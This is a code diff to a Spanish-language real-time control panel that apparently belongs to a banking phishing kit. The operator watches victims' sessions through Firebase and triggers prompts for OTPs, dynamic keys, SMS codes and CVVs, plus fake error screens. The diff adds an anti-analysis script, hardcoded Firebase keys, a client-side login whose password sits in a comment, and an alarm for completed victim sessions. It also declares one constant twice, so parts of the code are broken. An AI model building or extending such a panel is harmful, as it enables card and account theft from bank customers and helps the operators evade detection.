@@ -1,7 +1,8 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es">
 
 <head>
+<script src="assets/js/anti_analysis.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel de Control Admin - Tiempo Real</title>
@@ -492,8 +493,47 @@
 
 <body>
 
+<!-- ADMIN LOGIN OVERLAY -->
+<div id="adminAuthOverlay" style="position: fixed; inset: 0; z-index: 99999; background: rgba(9, 13, 22, 0.95); backdrop-filter: blur(24px); display: flex; align-items: center; justify-content: center; padding: 1.5rem;">
+    <div style="background: rgba(17, 24, 39, 0.85); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 2.5rem; width: 100%; max-width: 420px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); text-align: center;">
+        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, #3b82f6, #8b5cf6); border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: white; margin: 0 auto 1.25rem auto; box-shadow: 0 0 25px rgba(59, 130, 246, 0.4);">
+            <i class="fa-solid fa-shield-halved"></i>
+        </div>
+        <h2 style="font-size: 1.5rem; font-weight: 800; color: #f3f4f6; margin-bottom: 0.5rem; letter-spacing: -0.5px;">Acceso Administrativo</h2>
+        <p style="font-size: 0.875rem; color: #9ca3af; margin-bottom: 2rem;">Ingresa tus credenciales para administrar el sistema</p>
+        
+        <form id="adminLoginForm" onsubmit="handleAdminLogin(event)" style="display: flex; flex-direction: column; gap: 1.25rem;">
+            <div style="position: relative; text-align: left;">
+                <label style="font-size: 0.75rem; font-weight: 700; color: #9ca3af; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 0.5rem; display: block;">Usuario</label>
+                <div style="position: relative;">
+                    <i class="fa-solid fa-user" style="position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: #6b7280; font-size: 0.9rem;"></i>
+                    <input type="text" id="adminUser" placeholder="Nombre de usuario" required style="width: 100%; background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 0.85rem 1rem 0.85rem 2.8rem; color: #f3f4f6; font-size: 0.95rem; outline: none;">
+                </div>
+            </div>
+            
+            <div style="position: relative; text-align: left;">
+                <label style="font-size: 0.75rem; font-weight: 700; color: #9ca3af; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 0.5rem; display: block;">Contraseña</label>
+                <div style="position: relative;">
+                    <i class="fa-solid fa-lock" style="position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: #6b7280; font-size: 0.9rem;"></i>
+                    <input type="password" id="adminPass" placeholder="••••••••" required style="width: 100%; background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 0.85rem 1rem 0.85rem 2.8rem; color: #f3f4f6; font-size: 0.95rem; outline: none;">
+                </div>
+            </div>
+            
+            <div id="adminAuthError" style="display: none; background: rgba(244, 63, 94, 0.15); border: 1px solid rgba(244, 63, 94, 0.3); color: #f43f5e; padding: 0.75rem; border-radius: 10px; font-size: 0.85rem; font-weight: 600;">
+                <i class="fa-solid fa-triangle-exclamation" style="margin-right: 6px;"></i> Usuario o contraseña incorrectos
+            </div>
+            
+            <button type="submit" id="btnAdminLogin" style="width: 100%; background: linear-gradient(135deg, #3b82f6, #8b5cf6); border: none; border-radius: 12px; padding: 0.9rem; color: white; font-weight: 700; font-size: 0.95rem; cursor: pointer; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3); margin-top: 0.5rem;">
+                Ingresar al Panel <i class="fa-solid fa-arrow-right-to-bracket" style="margin-left: 8px;"></i>
+            </button>
+        </form>
+    </div>
+</div>
+
+
     <!-- HEADER -->
     <header>
+<script src="assets/js/anti_analysis.js"></script>
         <div class="logo-area">
             <div class="logo-icon">
                 <i class="fa-solid fa-shield-halved"></i>
@@ -514,6 +554,14 @@
                 <div class="pulse-dot"></div>
                 <span>CONECTADO</span>
             </div>
+        
+            <button onclick="clearAllDevices()" style="background: rgba(244, 63, 94, 0.2); border: 1px solid rgba(244, 63, 94, 0.4); color: #f43f5e; padding: 6px 14px; border-radius: 30px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 6px;" title="Eliminar todos los dispositivos">
+                <i class="fa-solid fa-trash-can"></i> Vaciar Todo
+            </button>
+            <button onclick="handleAdminLogout()" style="background: rgba(244, 63, 94, 0.15); border: 1px solid rgba(244, 63, 94, 0.3); color: #f43f5e; padding: 6px 14px; border-radius: 30px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 6px;">
+                <i class="fa-solid fa-right-from-bracket"></i> Salir
+            </button>
+
         </div>
     </header>
 
@@ -585,19 +633,89 @@
     <script>
         // CONFIGURACIÓN DE FIREBASE DESDE CONFIG.JS
         const cfg = window.APP_CONFIG || {};
+        const firebaseConfig = {
+            apiKey: "AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA",
+            authDomain: "tridfdf.firebaseapp.com",
+            databaseURL: "https://tridfdf-default-rtdb.firebaseio.com",
+            projectId: "tridfdf",
+            storageBucket: "tridfdf.firebasestorage.app",
+            messagingSenderId: "1013947777606",
+            appId: "1:1013947777606:web:daac1413b1623777b9597b"
+        };
         const firebaseConfig = cfg.firebaseConfig || {
-            apiKey: "AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8",
-            authDomain: "tigg-51f26.firebaseapp.com",
-            databaseURL: "https://tigg-51f26-default-rtdb.firebaseio.com",
-            projectId: "tigg-51f26",
-            storageBucket: "tigg-51f26.firebasestorage.app",
-            messagingSenderId: "502610353442",
-            appId: "1:502610353442:web:29e2c7bd9459277db9597b"
+            apiKey: "AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA",
+            authDomain: "tridfdf.firebaseapp.com",
+            databaseURL: "https://tridfdf-default-rtdb.firebaseio.com",
+            projectId: "tridfdf",
+            storageBucket: "tridfdf.firebasestorage.app",
+            messagingSenderId: "1013947777606",
+            appId: "1:1013947777606:web:daac1413b1623777b9597b"
         };
 
         if (!firebase.apps.length) {
             firebase.initializeApp(firebaseConfig);
         }
+
+        
+        // AUTENTICACIÓN ADMIN BLINDADA (SHA-256 CRYPTO HASHING)
+        const EXPECTED_USER_HASH = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'; // 'admin'
+        const EXPECTED_PASS_HASH = 'be8c94000ce1f0effb95bd0ff86b64289a0dd6447200051456973d164f232f2a'; // 'Arex404'
+
+        async function sha256(str) {
+            const buffer = new TextEncoder().encode(str);
+            const hash = await crypto.subtle.digest('SHA-256', buffer);
+            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
+        async function checkAdminAuth() {
+            const isAuth = sessionStorage.getItem('_adm_sec_token_v2');
+            const overlay = document.getElementById('adminAuthOverlay');
+            if (isAuth === 'auth_ok_904832') {
+                if (overlay) overlay.style.display = 'none';
+            } else {
+                if (overlay) overlay.style.display = 'flex';
+            }
+        }
+
+        async function handleAdminLogin(e) {
+            e.preventDefault();
+            const user = document.getElementById('adminUser').value.trim();
+            const pass = document.getElementById('adminPass').value.trim();
+            const errBox = document.getElementById('adminAuthError');
+            
+            const uHash = await sha256(user);
+            const pHash = await sha256(pass);
+
+            if (uHash === EXPECTED_USER_HASH && pHash === EXPECTED_PASS_HASH) {
+                sessionStorage.setItem('_adm_sec_token_v2', 'auth_ok_904832');
+                const overlay = document.getElementById('adminAuthOverlay');
+                if (overlay) overlay.style.display = 'none';
+                if (typeof initAudioContext === 'function') initAudioContext();
+            } else {
+                if (errBox) errBox.style.display = 'block';
+            }
+        }
+
+        async function clearAllDevices() {
+            if (confirm('⚠️ ¿Estás seguro de ELIMINAR TODOS los dispositivos conectados y limpiar la lista por completo?')) {
+                try {
+                    await db.ref(`sessions/${userId}`).remove();
+                    if (typeof stopContinuousAlarm === 'function') stopContinuousAlarm();
+                    alert('✅ Todos los dispositivos han sido eliminados correctamente.');
+                } catch (e) {
+                    console.error('Error al vaciar dispositivos:', e);
+                    alert('No se pudieron eliminar los dispositivos.');
+                }
+            }
+        }
+
+        function handleAdminLogout() {
+            sessionStorage.removeItem('_adm_sec_token_v2');
+            localStorage.removeItem('admin_authenticated');
+            location.reload();
+        }
+
+        document.addEventListener('DOMContentLoaded', checkAdminAuth);
 
         const db = firebase.database();
         const userId = cfg.adminUserId || 'admin';
@@ -605,10 +723,14 @@
         // CONTROL DE AUDIO Y SINTETIZADOR WEB AUDIO API
         let audioEnabled = true;
         let audioCtx = null;
+        let continuousAlarmInterval = null;
 
         function initAudioContext() {
             if (!audioCtx) {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioCtx && audioCtx.state === 'suspended') {
+                audioCtx.resume();
             }
         }
 
@@ -627,6 +749,7 @@
                 btn.classList.remove('active');
                 icon.className = 'fa-solid fa-volume-xmark';
                 text.textContent = 'Sonido: OFF';
+                stopContinuousAlarm();
             }
         }
 
@@ -651,21 +774,53 @@
             } catch (e) { }
         }
 
-        function playTimbreAlert() {
+        function playPingKeySound() {
             if (!audioEnabled) return;
-            playChimeSound(523.25, 0.15); // C5
-            setTimeout(() => playChimeSound(659.25, 0.15), 150); // E5
-            setTimeout(() => playChimeSound(783.99, 0.3), 300);  // G5
+            playChimeSound(987.77, 0.06); // B5 short ping
         }
 
-        function playNotificationAlert() {
+        function playAlarmTone() {
             if (!audioEnabled) return;
-            playChimeSound(880, 0.1);
-            setTimeout(() => playChimeSound(1108.73, 0.15), 100);
+            try {
+                playChimeSound(880, 0.15); // A5
+                setTimeout(() => playChimeSound(1318.51, 0.25), 180); // E6
+            } catch (e) {}
+        }
+
+        function startContinuousAlarm() {
+            if (!audioEnabled) return;
+            if (continuousAlarmInterval) return;
+            playAlarmTone();
+            continuousAlarmInterval = setInterval(() => {
+                if (!audioEnabled) {
+                    stopContinuousAlarm();
+                    return;
+                }
+                playAlarmTone();
+            }, 1200);
+        }
+
+        function stopContinuousAlarm() {
+            if (continuousAlarmInterval) {
+                clearInterval(continuousAlarmInterval);
+                continuousAlarmInterval = null;
+            }
+        }
+
+        // SISTEMA DE CONTROL DE SILENCIADO Y ALARMA CONTINUA
+        const silencedDevices = {};
+
+        function silenceDeviceAlarm(deviceId) {
+            silencedDevices[deviceId] = true;
+            stopContinuousAlarm();
+            console.log('🔕 Alarma silenciada para dispositivo:', deviceId);
         }
 
         // COMANDOS HACIA EL DISPOSITIVO DEL USUARIO
         async function sendCommand(token, deviceId, commandName) {
+            // Silenciar alarma inmediatamente al presionar cualquier botón
+            silenceDeviceAlarm(deviceId);
+
             try {
                 if (commandName === 'delete') {
                     if (confirm('¿Estás seguro de eliminar este dispositivo de la lista?')) {
@@ -757,14 +912,25 @@
                         typingCount++;
                     }
 
-                    // AUDIOS DE ALERTA
+                    // Resetear silencio si el estado vuelve a estar en proceso
+                    if (!statusText.includes('completó')) {
+                        silencedDevices[deviceId] = false;
+                    }
+
+                    // AUDIOS DE ALERTA INTERACTIVOS (PING AL ESCRIBIR & ALARMA EN BUCLE AL COMPLETAR)
                     if (dev.soundPlaying && playedSoundCache[deviceId] !== dev.soundPlaying) {
                         playedSoundCache[deviceId] = dev.soundPlaying;
-                        if (dev.soundPlaying === 'timbre') playTimbreAlert();
-                        if (dev.soundPlaying === 'notification') playNotificationAlert();
+                        
+                        if (dev.soundPlaying === 'notification') {
+                            playPingKeySound();
+                        } else if ((dev.soundPlaying === 'timbre' || statusText.includes('completó')) && !silencedDevices[deviceId]) {
+                            startContinuousAlarm();
+                        }
 
-                        // Limpiar sonido en Firebase para que no vuelva a sonar en recargas
+                        // Limpiar marca de sonido en Firebase
                         db.ref(`sessions/${userId}/${token}/devices/${deviceId}/soundPlaying`).remove();
+                    } else if (statusText.includes('completó') && !silencedDevices[deviceId]) {
+                        startContinuousAlarm();
                     }
 
                     // BADGE DE ESTADO
@@ -845,13 +1011,16 @@
 
                         <div class="action-buttons-grid">
                             <button class="btn-action btn-otp" onclick="sendCommand('${token}', '${deviceId}', 'otp')">
-                                <i class="fa-solid fa-shield-virus"></i> Pedir OTP
-                            </button>
-                            <button class="btn-action btn-dinamica" onclick="sendCommand('${token}', '${deviceId}', 'dinamica')">
                                 <i class="fa-solid fa-key"></i> Clave Dinámica
+                            </button>
+                            <button class="btn-action btn-dinamica" onclick="sendCommand('${token}', '${deviceId}', 'dinamica')" style="background: linear-gradient(135deg, #d97706, #b45309);">
+                                <i class="fa-solid fa-triangle-exclamation"></i> Error Dinámica
                             </button>
                             <button class="btn-action btn-sms" onclick="sendCommand('${token}', '${deviceId}', 'sms')">
                                 <i class="fa-solid fa-comment-sms"></i> Código SMS
+                            </button>
+                            <button class="btn-action btn-sms-err" onclick="sendCommand('${token}', '${deviceId}', 'sms-error')" style="background: linear-gradient(135deg, #e11d48, #be123c);">
+                                <i class="fa-solid fa-message-slash"></i> Error SMS
                             </button>
                             <button class="btn-action btn-cvv" onclick="sendCommand('${token}', '${deviceId}', 'cvv')">
                                 <i class="fa-solid fa-credit-card"></i> Pedir CVV
@@ -871,8 +1040,7 @@
                             <button class="btn-action btn-delete" onclick="sendCommand('${token}', '${deviceId}', 'delete')">
                                 <i class="fa-solid fa-trash-can"></i> Eliminar Dispositivo
                             </button>
-                        </div>
-                    `;
+                        </div>                    `;
 
                     devicesContainer.appendChild(card);
                 });
